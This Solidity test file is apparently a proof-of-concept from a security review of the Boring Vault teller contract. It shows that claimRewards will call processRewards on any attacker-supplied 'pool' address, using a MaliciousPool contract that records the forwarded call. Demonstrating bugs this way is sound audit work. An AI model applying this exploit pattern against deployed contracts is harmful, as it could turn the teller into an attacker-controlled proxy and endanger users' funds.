// SPDX-License-Identifier: SEL-1.0
// Copyright © 2025 Veda Tech Labs
// Derived from Boring Vault Software © 2025 Veda Tech Labs (TEST ONLY – NO COMMERCIAL USE)
// Licensed under Software Evaluation License, Version 1.0
pragma solidity 0.8.21;

import {Test, console} from "@forge-std/Test.sol";
import {BoringVault} from "src/base/BoringVault.sol";
import {TellerWithMultiAssetSupport, RewardData} from "src/base/Roles/TellerWithMultiAssetSupport.sol";
import {AccountantWithRateProviders} from "src/base/Roles/AccountantWithRateProviders.sol";
import {RolesAuthority, Authority} from "@solmate/auth/authorities/RolesAuthority.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";

/// @dev Minimal ERC20 so we can deploy without forking.
contract MockWETH is ERC20 {
    constructor() ERC20("Wrapped Ether", "WETH", 18) {}

    function deposit() external payable {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        _burn(msg.sender, amount);
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
    }

    receive() external payable {}
}

/// @dev A contract that impersonates an IncentivePool. The teller will call
///      processRewards on whatever address the user supplies in RewardData.pool,
///      without any allowlist check. This contract records the call to prove it.
contract MaliciousPool {
    bool public wasCalled;
    address public calledBy;
    address public receivedUser;
    uint256 public receivedCumulativeOwed;
    uint256 public receivedDeadline;
    bytes public receivedSignature;

    /// @dev Matches IncentivePool.processRewards selector exactly.
    function processRewards(
        address rewardsRecipient,
        uint256 cumulativeRewards,
        uint256 deadline,
        bytes calldata signature
    ) external returns (uint256) {
        wasCalled = true;
        calledBy = msg.sender;
        receivedUser = rewardsRecipient;
        receivedCumulativeOwed = cumulativeRewards;
        receivedDeadline = deadline;
        receivedSignature = signature;
        return 0;
    }
}

/// @notice Demonstrates that TellerWithMultiAssetSupport._processRewards will
///         call any user-supplied address as an IncentivePool, with no allowlist.
///         The teller becomes an unrestricted proxy: msg.sender to the target is
///         the teller itself, and all calldata is attacker-controlled.
contract TellerPoolAllowlistTest is Test {
    BoringVault public boringVault;
    TellerWithMultiAssetSupport public teller;
    AccountantWithRateProviders public accountant;
    RolesAuthority public rolesAuthority;
    MaliciousPool public maliciousPool;
    MockWETH public weth;

    address public attacker = vm.addr(0xBAD);
    address public payoutAddress = vm.addr(7777777);

    function setUp() external {
        weth = new MockWETH();
        boringVault = new BoringVault(address(this), "Boring Vault", "BV", 18);

        accountant = new AccountantWithRateProviders(
            address(this), address(boringVault), payoutAddress, 1e18, address(weth), 1.001e4, 0.999e4, 1, 0, 0
        );

        teller =
            new TellerWithMultiAssetSupport(address(this), address(boringVault), address(accountant), address(weth));

        rolesAuthority = new RolesAuthority(address(this), Authority(address(0)));

        boringVault.setAuthority(rolesAuthority);
        accountant.setAuthority(rolesAuthority);
        teller.setAuthority(rolesAuthority);

        // Make claimRewards publicly callable (same as deposit in the real setup).
        rolesAuthority.setPublicCapability(address(teller), TellerWithMultiAssetSupport.claimRewards.selector, true);

        maliciousPool = new MaliciousPool();
    }

    /// @notice Proves the teller will call processRewards on an arbitrary,
    ///         non-allowlisted address supplied by the caller.
    function testArbitraryPoolCall() external {
        // Attacker constructs RewardData pointing at the malicious pool.
        RewardData[] memory rewards = new RewardData[](1);
        rewards[0] = RewardData({
            pool: address(maliciousPool),
            cumulativeOwed: 999e18,
            deadline: block.timestamp + 1 days,
            signature: hex"deadbeef"
        });

        // Call claimRewards as the attacker.
        vm.prank(attacker);
        teller.claimRewards(rewards);

        // The malicious pool was called by the teller with attacker-controlled args.
        assertTrue(maliciousPool.wasCalled(), "malicious pool should have been called");
        assertEq(maliciousPool.calledBy(), address(teller), "msg.sender should be the teller");
        assertEq(maliciousPool.receivedUser(), attacker, "user should be the attacker address");
        assertEq(maliciousPool.receivedCumulativeOwed(), 999e18, "cumulativeOwed forwarded");
        assertEq(maliciousPool.receivedDeadline(), block.timestamp + 1 days, "deadline forwarded");
        assertEq(maliciousPool.receivedSignature(), hex"deadbeef", "signature forwarded");
    }
}
